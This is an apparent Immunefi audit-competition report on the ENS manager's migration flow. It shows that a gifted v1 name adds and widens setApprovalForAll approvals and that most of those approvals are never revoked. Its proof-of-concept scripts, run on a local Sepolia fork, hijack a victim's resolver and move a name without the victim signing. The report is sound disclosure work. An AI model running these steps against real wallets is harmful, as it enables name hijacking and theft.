# 91839 w a insight an attacker gifted v1 name modifies the arguments of the migration transaction set the victim signs adding an approval that would not otherwise be requested and widening a toke&#x20;

**Submitted on Sep 4th 2026 at 16:55:34 UTC by @br0nz3p1ck4x3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91839
* **Report Type:** Websites & Apps
* **Report severity:** Insight
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Summary

The migration flow derives the calls the victim is asked to sign from the contents of their migration plan, and the plan admits names the victim never asked for. An ERC-1155 or ERC-721 arrives without consent, so a third party can put a name into that plan. Doing so changes the arguments of the transaction set the connected wallet then signs.

Two separate defects follow, sharing that one attacker primitive.

**A. An attacker can add an approval call to the victim's migration, and widen the scope of another.** The set of approvals the victim is asked to sign is derived from the names in their migration plan. A single unwrapped v1 name gifted by an attacker, with the ENSRegistry controller left unreclaimed, flips `requiresManagerRestoration` and appends `setApprovalForAll` on the **V2 ETHRegistry**, covering every v2 name the victim owns. Without that gifted name the approval is not requested at all. Separately, going from one missing unwrapped token to two converts a token-scoped `approve(operator, tokenId)` into a collection-wide `setApprovalForAll` on the **V1 BaseRegistrar**, so one extra gifted name also widens that approval.

**B. Two of the three operator approvals are never revoked,** and the shipped release notes state the opposite.

```ts
// apps/manager/src/features/migration/service/migrationApprovals.ts:73-81
/**
 * Only direct HCA permissions are temporary. MigrationHelper approvals are
 * intentionally reusable: the helper resolves every caller back to its
 * certified owner before it can move that owner's V1 names.
 */
export const requiresMigrationApprovalCleanup = (
  approval: MigrationApproval,
): approval is MigrationCleanupApproval =>
  approval.kind === 'operator' && approval.id === 'eth-registry:hca'
```

```
// apps/manager/docs/HCA_MIGRATION_RELEASE_NOTES.md:69-74
Operator approvals created by the migration are temporary and are revoked
automatically after the atomic batches verify. This includes NFT access for
MigrationHelper and any manager-restoration access for the HCA.
```

The release notes promise that MigrationHelper access is revoked. The code says MigrationHelper approvals are intentionally never revoked. Both cannot be true, and the code is what ships.

The one approval that is revoked is also revoked only on the success path. `revokeTemporaryOperatorApprovals` is called after `executeRemainingAtomicBatches` with no `finally` (`migrationService.ts:1205-1211`), so any throw in approval submission or batch execution skips it and leaves the blanket ETHRegistry approval standing.

## Impact

The attacker primitive is the same one that makes the stale-controller role grant work, and it costs one ordinary registration plus one `safeTransferFrom`. In v1, transferring the ERC-721 moves the registrant and leaves the ENSRegistry controller with the sender, so the attacker gifts a name and simply does not call `reclaim()`.

That single gifted name, sitting in the victim's list and selected by default (`useNameSelection.ts:33-39` seeds the selection with every eligible name), changes what the victim is asked to sign. This is the modification of transaction parameters that the impact row describes: the attacker does not touch the wallet, does not need a signature, and does not need the victim to visit anything. They put one token in the victim's wallet, and the victim's next migration carries different calls with wider scope than it otherwise would:

| Without the gifted name                                                              | With the gifted name                                                                                     |
| ------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------- |
| `base-registrar:hca-token`, `approve(MigrationHelper, tokenId)`, scoped to one token | `base-registrar:hca-token` plus `eth-registry:hca`, `setApprovalForAll(HCA, true)` on the V2 ETHRegistry |

The added approval is collection-wide and open-ended. The PoC shows it covering a v2 name the victim registers **after** the migration finished, which the victim could not have consented to because it did not exist yet.

The holder of that approval is the victim's own HCA, not the attacker, and this report does not claim otherwise. What makes it material is what the HCA is: per the project's own **R2-03**, the prompt-free session adds an ephemeral key as a time-boxed co-owner with full owner authority for seven days, held in browser storage, and per **R2-06** there is no on-chain revoke, so the seven-day lifetime is the real bound. An attacker who can cause a broader, longer-lived approval to that account has widened the blast radius of an accepted design residual, without the victim seeing a difference in the UI.

For the V1 BaseRegistrar and NameWrapper approvals, the operator is the pinned MigrationHelper and those grants are permanent by construction. The user is told they are temporary.

The victim sees none of this. `NameRow.tsx` renders a name, an avatar and a checkbox. No manager, no resolver, no approval scope. The wallet step is labelled `Approve manager restoration` with the subtitle `Restore the existing managers for your names`.

## Root cause

### A. Approval scope is derived from attacker-influenceable plan contents

| File:line                                                                          | Code                                                                                                                           |
| ---------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| `packages/migration/src/service/classifyNames.ts:162-167`                          | `managerAddress` is set whenever the ENSRegistry controller differs from the registrant                                        |
| `apps/manager/src/features/migration/service/computeMigrationPreflight.ts:205-207` | `requiresManagerRestoration = classified.some((name) => name.managerAddress !== null)`                                         |
| `apps/manager/src/features/migration/service/migrationService.ts:346-348`          | the same expression again at submit time                                                                                       |
| `apps/manager/src/features/migration/service/migrationApprovals.ts:320-323`        | `if (needs.requiresManagerRestoration && !status.ethRegistryHcaApproved)` pushes `eth-registry:hca`                            |
| `apps/manager/src/features/migration/service/migrationApprovals.ts:118-123`        | `eth-registry:hca` is `{ contractAddress: V2_CONTRACTS.ETHRegistry, operatorAddress: hcaAddress }`                             |
| `apps/manager/src/features/migration/service/migrationApprovals.ts:299-313`        | `missingTokenIds.length === 1` yields a token-scoped approval, otherwise a blanket `setApprovalForAll` on the V1 BaseRegistrar |
| `apps/manager/src/features/migration/service/migrationApprovals.ts:343-352`        | `buildMigrationApprovalCall` encodes `setApprovalForAll(operator, true)` for every operator approval                           |
| `apps/manager/src/features/migration/components/useNameSelection.ts:33-39`         | every eligible name, including the gifted one, is selected by default                                                          |

### B. Cleanup covers one approval of three, and only on success

| File:line                                                                   | Code                                                                                                                    |
| --------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| `apps/manager/src/features/migration/service/migrationApprovals.ts:78-81`   | `requiresMigrationApprovalCleanup` returns true only for `eth-registry:hca`                                             |
| `apps/manager/src/features/migration/service/migrationService.ts:453-455`   | the revoke set is `plan.preflight.migrationApprovals.filter(requiresMigrationApprovalCleanup)`                          |
| `apps/manager/src/features/migration/service/migrationService.ts:1205-1211` | `revokeTemporaryOperatorApprovals` runs after `executeRemainingAtomicBatches`, with no `finally`, so any throw skips it |
| `apps/manager/docs/HCA_MIGRATION_RELEASE_NOTES.md:69-74`                    | states that MigrationHelper NFT access is revoked automatically                                                         |

## Recommendation

1. Do not let a name the user did not register, and whose controller they never appointed, silently widen the approval set. Treat an unreclaimed controller as suspect rather than as an appointed manager, which also fixes the companion role-grant finding.
2. Show the approval scope in the UI before it is signed: which contract, which operator, and whether it is token-scoped or collection-wide.
3. Wrap `revokeTemporaryOperatorApprovals` in a `finally`, or compute the revoke set from live chain state rather than from `plan.preflight`, so a failed or abandoned run does not leave a blanket approval standing.
4. Either revoke the MigrationHelper approvals as the release notes promise, or correct the release notes and the wallet-step copy so they do not describe those grants as temporary.
5. Prefer per-token `approve` over `setApprovalForAll` wherever the token set is known, rather than only when exactly one token is missing.

## Proof of Concept

## Proof of Concept

Executed against a local Anvil fork of Sepolia at block 11601093. No live network was touched. The on-chain script refuses to start against a non-local RPC.

### Environment

```
anvil --fork-url <sepolia-rpc> --fork-block-number 11601093 --port 18546 --chain-id 11155111
cast chain-id --rpc-url http://127.0.0.1:18546     # 11155111

ETHRegistrar   0xa88553F454b77203B0D036A05c894d555EAAa2Cc
ETHRegistry    0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
BaseRegistrar  0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85
NameWrapper    0x0635513f179D50A207757E05759CbD106d7dFcE8
MigrationHelper 0xddC597d937618849348E18Db5D631Ce747bCDeEF
MockUSDC       0x768F42455A2D082E23ceeF7d51e5787C82d67a39
```

### Part A: the app's own planner adds the blanket approval, and the cleanup skips two of three

`apps/manager/src/features/migration/service/POC-migration.test.ts` runs the real `planMigrationApprovals`, `migrationApprovalForId`, `requiresMigrationApprovalCleanup`, `buildMigrationApprovalCall` and `buildMigrationOperatorApprovalRevocationCall`. Nothing is hand-encoded. The same file carries the companion role-grant finding, whose assertions are reported separately.

Run with `pnpm --filter @ens-apps/manager exec vitest run POC-migration --reporter=verbose`.

```ts
/**
 * PoC Part A for BOTH migration findings. Drives the REAL application code.
 * No chain required.
 *
 * Run: pnpm exec vitest run POC-migration --reporter=verbose
 */
import { classifyName } from '@ens-apps/migration'
import { labelToCanonicalId, registryRoles } from '@ensdomains/ensjs/utils/v2'
import { decodeFunctionData, erc721Abi, parseAbi } from 'viem'
import { describe, expect, it } from 'vitest'
import { V1_CONTRACTS, V2_CONTRACTS } from '../contracts/addresses'
import { buildRoleGrantCall } from './buildRoleGrantCalls'
import {
  buildMigrationApprovalCall,
  buildMigrationOperatorApprovalRevocationCall,
  migrationApprovalForId,
  planMigrationApprovals,
  requiresMigrationApprovalCleanup,
} from './migrationApprovals'

const VICTIM   = '0x1111111111111111111111111111111111111111' as const
const ATTACKER = '0x2222222222222222222222222222222222222222' as const
const HCA      = '0x3333333333333333333333333333333333333333' as const

const grantRolesAbi = parseAbi(['function grantRoles(uint256 resource, uint256 roleBitmap, address account)'])
const approvalAbi = parseAbi(['function setApprovalForAll(address operator, bool approved)'])

/**
 * A v1 .eth name the victim HOLDS (registrant) but whose ENSRegistry
 * controller is still the attacker. This is the ordinary post-sale state:
 * BaseRegistrar.safeTransferFrom moves the registrant and leaves the
 * controller untouched until someone calls reclaim().
 */
const giftedName = {
  id: '0xabc',
  labelName: 'giftedname',
  labelhash: '0xdef',
  name: 'giftedname.eth',
  resolver: null,
  owner: { id: ATTACKER },        // ENSRegistry controller: still the attacker
  registrant: { id: VICTIM },     // ERC-721 holder: the victim
  wrappedOwner: null,
  parent: { name: 'eth', wrappedDomain: null },
  registration: { expiryDate: String(Math.floor(Date.now() / 1000) + 31536000) },
  wrappedDomain: null,
}

describe('FINDING A: migration grants the stale v1 controller a permanent v2 role', () => {
  it('classifyName lifts the attacker address out of the subgraph as managerAddress', () => {
    const result = classifyName(giftedName as never, VICTIM)
    console.log('\n=== FINDING A / step 1: classifyName (real code) ===')
    console.log('registrant (ERC-721 holder) :', giftedName.registrant.id, '(victim)')
    console.log('owner (ENSRegistry ctrl)    :', giftedName.owner.id, '(attacker)')
    console.log('classified.type             :', (result as any)?.type)
    console.log('classified.managerAddress   :', (result as any)?.name?.managerAddress)
    expect((result as any)?.type).toBe('classified')
    expect((result as any)?.name?.managerAddress?.toLowerCase()).toBe(ATTACKER)
  })

  it('buildRoleGrantCall encodes ROLE_SET_RESOLVER for that attacker address', () => {
    const classified = (classifyName(giftedName as never, VICTIM) as any).name
    const call = buildRoleGrantCall(classified)
    const decoded = decodeFunctionData({ abi: grantRolesAbi, data: call.data })
    const [resource, roleBitmap, account] = decoded.args as [bigint, bigint, string]

    console.log('\n=== FINDING A / step 2: buildRoleGrantCall (real code) ===')
    console.log('to           :', call.to, '(V2 ETHRegistry)')
    console.log('function     :', decoded.functionName)
    console.log('resource     :', resource.toString())
    console.log('  = labelToCanonicalId("giftedname") :', labelToCanonicalId('giftedname').toString())
    console.log('roleBitmap   :', roleBitmap.toString(), '= 1n << 24n')
    console.log('  ensjs registryRoles.ROLE_SET_RESOLVER :', registryRoles.ROLE_SET_RESOLVER.toString())
    console.log('account      :', account, '<-- THE ATTACKER, never rendered anywhere in the UI')

    expect(call.to).toBe(V2_CONTRACTS.ETHRegistry)
    expect(decoded.functionName).toBe('grantRoles')
    expect(resource).toBe(labelToCanonicalId('giftedname'))
    // The hardcoded constant really is ROLE_SET_RESOLVER per the pinned ensjs.
    expect(roleBitmap).toBe(registryRoles.ROLE_SET_RESOLVER)
    expect(account.toLowerCase()).toBe(ATTACKER)
  })
})

describe('FINDING B: a single gifted name induces a blanket operator approval', () => {
  const status = {
    baseRegistrarHcaApproved: false,
    nameWrapperHcaApproved: false,
    ethRegistryHcaApproved: false,
    unwrappedTokenApprovals: [],
  }

  it('the eth-registry:hca blanket approval appears ONLY because of the gifted name', () => {
    const without = planMigrationApprovals({
      hcaAddress: HCA,
      needs: { hasUnwrapped: true, hasWrapped: false, requiresManagerRestoration: false, unwrappedTokenIds: [1n] },
      status,
    })
    const with_ = planMigrationApprovals({
      hcaAddress: HCA,
      needs: { hasUnwrapped: true, hasWrapped: false, requiresManagerRestoration: true, unwrappedTokenIds: [1n] },
      status,
    })
    console.log('\n=== FINDING B / step 1: planMigrationApprovals (real code) ===')
    console.log('without gifted name :', without.map((a) => a.id).join(', '))
    console.log('with gifted name    :', with_.map((a) => a.id).join(', '), '<-- extra blanket grant')
    const extra = with_.find((a) => a.id === 'eth-registry:hca') as any
    console.log('  contract :', extra.contractAddress, '(V2 ETHRegistry: ALL the victim\'s v2 names)')
    console.log('  operator :', extra.operatorAddress)
    expect(without.some((a) => a.id === 'eth-registry:hca')).toBe(false)
    expect(with_.some((a) => a.id === 'eth-registry:hca')).toBe(true)
    expect(extra.contractAddress).toBe(V2_CONTRACTS.ETHRegistry)
  })

  it('one extra unwrapped token turns a scoped approve() into a blanket setApprovalForAll', () => {
    const one = planMigrationApprovals({
      hcaAddress: HCA,
      needs: { hasUnwrapped: true, hasWrapped: false, requiresManagerRestoration: false, unwrappedTokenIds: [1n] },
      status,
    })
    const two = planMigrationApprovals({
      hcaAddress: HCA,
      needs: { hasUnwrapped: true, hasWrapped: false, requiresManagerRestoration: false, unwrappedTokenIds: [1n, 2n] },
      status,
    })
    const oneCall = buildMigrationApprovalCall(one[0])
    const twoCall = buildMigrationApprovalCall(two[0])
    console.log('\n=== FINDING B / step 2: scope escalation ===')
    console.log('1 unwrapped token  -> id', one[0].id, '->', decodeFunctionData({ abi: erc721Abi, data: oneCall.data }).functionName, '(scoped to one token)')
    console.log('2 unwrapped tokens -> id', two[0].id, '->', decodeFunctionData({ abi: approvalAbi, data: twoCall.data }).functionName, '(BLANKET, whole collection)')
    console.log('   to :', twoCall.to, '(V1 BaseRegistrar)')
    expect(one[0].kind).toBe('erc721-token')
    expect(two[0].kind).toBe('operator')
    expect(decodeFunctionData({ abi: approvalAbi, data: twoCall.data }).functionName).toBe('setApprovalForAll')
  })

  it('only 1 of the 3 operator approvals is ever revoked', () => {
    const ids = ['base-registrar:hca', 'name-wrapper:hca', 'eth-registry:hca'] as const
    console.log('\n=== FINDING B / step 3: requiresMigrationApprovalCleanup (real code) ===')
    const revoked: string[] = []
    for (const id of ids) {
      const approval = migrationApprovalForId({ id, hcaAddress: HCA })
      const willRevoke = requiresMigrationApprovalCleanup(approval)
      if (willRevoke) revoked.push(id)
      console.log(
        `${id.padEnd(22)} contract=${(approval as any).contractAddress} operator=${(approval as any).operatorAddress} revoked=${willRevoke}`,
      )
    }
    console.log('=> permanently retained:', ids.filter((i) => !revoked.includes(i)).join(', '))
    expect(revoked).toEqual(['eth-registry:hca'])
  })

  it('the revocation call is a plain setApprovalForAll(operator, false)', () => {
    const approval = migrationApprovalForId({ id: 'eth-registry:hca', hcaAddress: HCA }) as any
    const call = buildMigrationOperatorApprovalRevocationCall(approval)
    const d = decodeFunctionData({ abi: approvalAbi, data: call.data })
    console.log('\n=== FINDING B / step 4: the one revocation that does run ===')
    console.log('to  :', call.to)
    console.log('call:', d.functionName, d.args)
    expect(d.args[1]).toBe(false)
  })
})
```

Actual output for this finding:

```
=== FINDING B / step 1: planMigrationApprovals (real code) ===
without gifted name : base-registrar:hca-token
with gifted name    : base-registrar:hca-token, eth-registry:hca <-- extra blanket grant
  contract : 0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2 (V2 ETHRegistry: ALL the victim's v2 names)
  operator : 0x3333333333333333333333333333333333333333

=== FINDING B / step 2: scope escalation ===
1 unwrapped token  -> id base-registrar:hca-token -> approve (scoped to one token)
2 unwrapped tokens -> id base-registrar:hca -> setApprovalForAll (BLANKET, whole collection)
   to : 0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85 (V1 BaseRegistrar)

=== FINDING B / step 3: requiresMigrationApprovalCleanup (real code) ===
base-registrar:hca     contract=0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85 operator=0xddC597d937618849348E18Db5D631Ce747bCDeEF revoked=false
name-wrapper:hca       contract=0x0635513f179D50A207757E05759CbD106d7dFcE8 operator=0xddC597d937618849348E18Db5D631Ce747bCDeEF revoked=false
eth-registry:hca       contract=0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2 operator=0x3333333333333333333333333333333333333333 revoked=true
=> permanently retained: base-registrar:hca, name-wrapper:hca

=== FINDING B / step 4: the one revocation that does run ===
to  : 0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
call: setApprovalForAll [ '0x3333333333333333333333333333333333333333', false ]
```

Reading that output directly: the blanket ETHRegistry approval exists only in the plan that contains the gifted name, one extra unwrapped token turns `approve` into `setApprovalForAll`, and of the three operator approvals only `eth-registry:hca` is ever revoked, leaving the BaseRegistrar and NameWrapper grants to MigrationHelper permanently in place.

### Part B: what the blanket approval actually permits

`poc-migration-onchain.mjs` runs the exact `setApprovalForAll` call `buildMigrationApprovalCall` produces, then has the victim register a further name and shows the operator moving it with no victim signature.

```js
/**
 * PoC Part B for BOTH migration findings.
 * Local Anvil fork of Sepolia @ 11601093. Never a live network.
 *
 * FINDING A: the role the migration batch grants to the stale v1 controller
 *            really does let that third party repoint the victim's resolver.
 * FINDING B: the blanket operator approval the migration induces really does
 *            cover every v2 name the victim owns, including names registered
 *            AFTER the approval was given.
 *
 * Run: node poc-migration-onchain.mjs
 */
import {
  createPublicClient, createWalletClient, http, parseAbi, encodeAbiParameters,
  keccak256, toHex, pad, hexToBigInt, zeroAddress, getAddress,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { labelToCanonicalId, registryRoles } from '@ensdomains/ensjs/utils/v2'

const RPC = process.env.POC_RPC ?? 'http://127.0.0.1:18546'
if (!/^https?:\/\/(127\.0\.0\.1|localhost)(:|\/)/.test(RPC)) {
  throw new Error(`refusing to run against a non-local RPC: ${RPC}`)
}

const ETH_REGISTRAR = '0xa88553F454b77203B0D036A05c894d555EAAa2Cc'
const ETH_REGISTRY  = '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2'
const USDC          = '0x768F42455A2D082E23ceeF7d51e5787C82d67a39'
const VERIFIABLE_FACTORY = '0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef'
const PERM_RESOLVER_IMPL = '0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e'
const ROLES_ALL = 0x1111111111111111111111111111111111111111111111111111111111111111n
const DURATION = 31536000n

const RUN = process.env.POC_RUN ?? String(Date.now()).slice(-6)
const NAME_A = `giftedname${RUN}`   // the name whose resolver gets hijacked
const NAME_B = `laterName${RUN}`    // registered AFTER the blanket approval

const victim   = privateKeyToAccount(keccak256(toHex(`mig-victim-${RUN}`)))
const attacker = privateKeyToAccount(keccak256(toHex(`mig-attacker-${RUN}`)))
const hcaLike  = privateKeyToAccount(keccak256(toHex(`mig-operator-${RUN}`)))

const pub = createPublicClient({ chain: sepolia, transport: http(RPC) })
const wc = (a) => createWalletClient({ account: a, chain: sepolia, transport: http(RPC) })

const registrarAbi = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) view returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256, uint256)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer)',
])
const registryAbi = parseAbi([
  'function grantRoles(uint256 resource, uint256 roleBitmap, address account)',
  'function hasRoles(uint256 resource, uint256 roleBitmap, address account) view returns (bool)',
  'function setResolver(uint256 anyId, address resolver)',
  'function getResolver(string label) view returns (address)',
  'function getState(uint256 anyId) view returns ((uint8 status, uint64 expiry, address latestOwner, uint256 tokenId, uint256 resource) state)',
  'function setApprovalForAll(address operator, bool approved)',
  'function isApprovedForAll(address owner, address operator) view returns (bool)',
  'function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes data)',
])
const erc20Abi = parseAbi(['function approve(address spender, uint256 amount) returns (bool)'])
const factoryAbi = parseAbi(['function deployProxy(address implementation, uint256 salt, bytes data) returns (address)'])
const resolverAbi = parseAbi(['function initialize(address owner, uint256 roles, bytes[] data)'])

const rpc = (m, p) => fetch(RPC, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: m, params: p }) }).then((r) => r.json())
const log = (...a) => console.log(...a)
const hr = (t) => log(`\n${'='.repeat(72)}\n${t}\n${'='.repeat(72)}`)

async function send(acct, req) {
  const hash = await wc(acct).writeContract(req)
  const rc = await pub.waitForTransactionReceipt({ hash })
  if (rc.status !== 'success') throw new Error(`tx reverted ${hash}`)
  return rc
}
async function fundUsdc(addr, amount) {
  const slot = keccak256(encodeAbiParameters([{ type: 'address' }, { type: 'uint256' }], [addr, 0n]))
  await rpc('anvil_setStorageAt', [USDC, slot, pad(toHex(amount), { size: 32 })])
}
async function registerName({ acct, label, resolver = zeroAddress }) {
  const [base, prem] = await pub.readContract({ address: ETH_REGISTRAR, abi: registrarAbi, functionName: 'getRegisterPrice', args: [label, DURATION, USDC] })
  const price = base + prem
  await fundUsdc(acct.address, price * 10n)
  await send(acct, { address: USDC, abi: erc20Abi, functionName: 'approve', args: [ETH_REGISTRAR, price * 10n] })
  const secret = keccak256(toHex(`mig-${label}-${RUN}`))
  const c = await pub.readContract({ address: ETH_REGISTRAR, abi: registrarAbi, functionName: 'makeCommitment', args: [label, acct.address, secret, zeroAddress, resolver, DURATION, pad('0x00', { size: 32 })] })
  await send(acct, { address: ETH_REGISTRAR, abi: registrarAbi, functionName: 'commit', args: [c] })
  await rpc('evm_increaseTime', [120]); await rpc('evm_mine', [])
  await send(acct, { address: ETH_REGISTRAR, abi: registrarAbi, functionName: 'register', args: [label, acct.address, secret, zeroAddress, resolver, DURATION, USDC, pad('0x00', { size: 32 })] })
}
const stateOf = (label) => pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'getState', args: [labelToCanonicalId(label)] })

hr('SETUP')
for (const a of [victim.address, attacker.address, hcaLike.address]) {
  await rpc('anvil_setBalance', [a, '0x21e19e0c9bab2400000'])
  const code = await pub.getCode({ address: a })
  if (code && code !== '0x') throw new Error(`${a} has code`)
}
log('RPC        :', RPC, '(local fork, enforced)')
log('chain/block:', await pub.getChainId(), '/', await pub.getBlockNumber())
log('victim     :', victim.address)
log('attacker   :', attacker.address, '(the stale v1 ENSRegistry controller)')
log('operator   :', hcaLike.address, '(stands in for the victim HCA)')

await registerName({ acct: victim, label: NAME_A })
log(`\nvictim registered ${NAME_A}.eth`)

// ---------------------------------------------------------------------------
hr('FINDING A: the granted role lets a third party repoint the victim resolver')
const resourceA = labelToCanonicalId(NAME_A)
log('resource (labelToCanonicalId) :', resourceA.toString())
log('role granted by the migration :', registryRoles.ROLE_SET_RESOLVER.toString(), '(ROLE_SET_RESOLVER)')

let attackerHas = await pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'hasRoles', args: [resourceA, registryRoles.ROLE_SET_RESOLVER, attacker.address] })
log('\nBEFORE  attacker holds ROLE_SET_RESOLVER :', attackerHas)

// This is exactly the call buildRoleGrantCall() produces, inside the migration batch.
await send(victim, { address: ETH_REGISTRY, abi: registryAbi, functionName: 'grantRoles', args: [resourceA, registryRoles.ROLE_SET_RESOLVER, attacker.address] })
log('victim ran the migration batch call: grantRoles(resource, ROLE_SET_RESOLVER, attacker)')

attackerHas = await pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'hasRoles', args: [resourceA, registryRoles.ROLE_SET_RESOLVER, attacker.address] })
log('AFTER   attacker holds ROLE_SET_RESOLVER :', attackerHas)

// The attacker deploys a resolver it controls and repoints the victim's name at it.
const salt = hexToBigInt(keccak256(toHex(`mig-att-resolver-${RUN}`)))
const initData = await (async () => {
  const { encodeFunctionData } = await import('viem')
  return encodeFunctionData({ abi: resolverAbi, functionName: 'initialize', args: [attacker.address, ROLES_ALL, []] })
})()
const { result: attackerResolver } = await pub.simulateContract({ account: attacker, address: VERIFIABLE_FACTORY, abi: factoryAbi, functionName: 'deployProxy', args: [PERM_RESOLVER_IMPL, salt, initData] })
await send(attacker, { address: VERIFIABLE_FACTORY, abi: factoryAbi, functionName: 'deployProxy', args: [PERM_RESOLVER_IMPL, salt, initData] })

log('\nresolver BEFORE :', await pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'getResolver', args: [NAME_A] }))
await send(attacker, { address: ETH_REGISTRY, abi: registryAbi, functionName: 'setResolver', args: [resourceA, attackerResolver] })
const resolverAfter = await pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'getResolver', args: [NAME_A] })
log('attacker called setResolver on the victim name')
log('resolver AFTER  :', resolverAfter, '(attacker-controlled)')
log('=> a third party now owns what', `${NAME_A}.eth`, 'resolves to:', getAddress(resolverAfter) === getAddress(attackerResolver))

// Recovery enumeration
hr('FINDING A: recovery enumeration')
log('a) The victim can call setResolver back to a good resolver.')
await send(victim, { address: ETH_REGISTRY, abi: registryAbi, functionName: 'setResolver', args: [resourceA, zeroAddress] })
log('   done, resolver is now', await pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'getResolver', args: [NAME_A] }))
log('b) BUT the attacker still holds the role and can undo it immediately:')
await send(attacker, { address: ETH_REGISTRY, abi: registryAbi, functionName: 'setResolver', args: [resourceA, attackerResolver] })
log('   attacker re-pointed it again ->', await pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'getResolver', args: [NAME_A] }))
log('c) The real fix is revokeRoles, which the MANAGER app has no UI for.')
log('   This is a repointing loop until the victim finds the Explorer roles page.')

// ---------------------------------------------------------------------------
hr('FINDING B: the blanket approval covers names that did not exist yet')
log('isApprovedForAll(victim, operator) BEFORE :', await pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'isApprovedForAll', args: [victim.address, hcaLike.address] }))

// Exactly the call buildMigrationApprovalCall() produces for 'eth-registry:hca'.
await send(victim, { address: ETH_REGISTRY, abi: registryAbi, functionName: 'setApprovalForAll', args: [hcaLike.address, true] })
log('victim ran the migration approval call: setApprovalForAll(operator, true) on ETHRegistry')
log('isApprovedForAll(victim, operator) AFTER  :', await pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'isApprovedForAll', args: [victim.address, hcaLike.address] }))

// A name the victim registers LATER, long after migration finished.
await registerName({ acct: victim, label: NAME_B })
const stB = await stateOf(NAME_B)
log(`\nvictim later registered ${NAME_B}.eth, owner =`, stB.latestOwner)

// The operator moves it without the victim signing anything.
await send(hcaLike, { address: ETH_REGISTRY, abi: registryAbi, functionName: 'safeTransferFrom', args: [victim.address, attacker.address, stB.tokenId, 1n, '0x'] })
const stB2 = await stateOf(NAME_B)
log('operator called safeTransferFrom on it, with NO victim signature')
log(`${NAME_B}.eth owner now =`, stB2.latestOwner, getAddress(stB2.latestOwner) === getAddress(attacker.address) ? '<- MOVED' : '')
log('\n=> the approval induced during migration covers names registered afterwards.')
log('=> it is scoped to the whole collection and has no expiry.')
```

Actual output, setup:

```

========================================================================
SETUP
========================================================================
RPC        : http://127.0.0.1:18546 (local fork, enforced)
chain/block: 11155111 / 11601188n
victim     : 0x55C7efb323878878dD88deFfA0c88cC5938b482F
attacker   : 0xBbE075Be19AC9dfB3D010cb69c0a686787A1bE22 (the stale v1 ENSRegistry controller)
operator   : 0x5E507DFF082A7658268bb65Dd76A45534CAF33f7 (stands in for the victim HCA)

victim registered giftednamed4e5f6.eth

========================================================================
```

Finding B section:

```
FINDING B: the blanket approval covers names that did not exist yet
========================================================================
isApprovedForAll(victim, operator) BEFORE : false
victim ran the migration approval call: setApprovalForAll(operator, true) on ETHRegistry
isApprovedForAll(victim, operator) AFTER  : true

victim later registered laterNamed4e5f6.eth, owner = 0x55C7efb323878878dD88deFfA0c88cC5938b482F
operator called safeTransferFrom on it, with NO victim signature
laterNamed4e5f6.eth owner now = 0xBbE075Be19AC9dfB3D010cb69c0a686787A1bE22 <- MOVED

=> the approval induced during migration covers names registered afterwards.
=> it is scoped to the whole collection and has no expiry.
```

The approval granted during migration covered a name that did not exist when it was granted, and the operator moved it without the owner signing anything.

## Preempting the likely closure arguments

**The operator is not the attacker, and this report does not pretend otherwise.** The `eth-registry:hca` operator is the victim's own HCA, verified on chain against the connected EOA before the grant is built (`verifyStandaloneHca`, `migrationService.ts:1181-1187` runs before `ensureMigrationApprovals` at `:1189`), and the BaseRegistrar and NameWrapper operator is the pinned MigrationHelper. That is precisely why the sub-bullet claimed is "Modifying transaction arguments or parameters" and not "inducing a blanket token approval to an attacker-controlled address". The demonstrated behaviour is that a third party changes the calls, and the scope of the calls, in a transaction set the victim signs with an already-connected wallet. Nothing in that sub-bullet requires the resulting grantee to be the attacker.

**"The victim consented, they clicked Upgrade" does not hold.** Consent was given to migrate their names. The approval that appears because of the gifted name is not disclosed at any point: `NameRow.tsx` renders a name, an avatar and a checkbox, and the wallet step reads only `Approve manager restoration` over `Restore the existing managers for your names`. Neither the contract, nor the operator, nor the fact that the grant is collection-wide is shown. The victim cannot consent to a scope they are never told about, and cannot deselect a name whose significance is not surfaced.

**The reusability of the MigrationHelper approvals is deliberate, and that is the point.** The code comment says so explicitly. What is not deliberate is that the shipped release notes tell users the opposite, and the wallet-step copy calls the access temporary. Either the behaviour or the documentation is wrong, and users are making a signing decision based on the documentation.

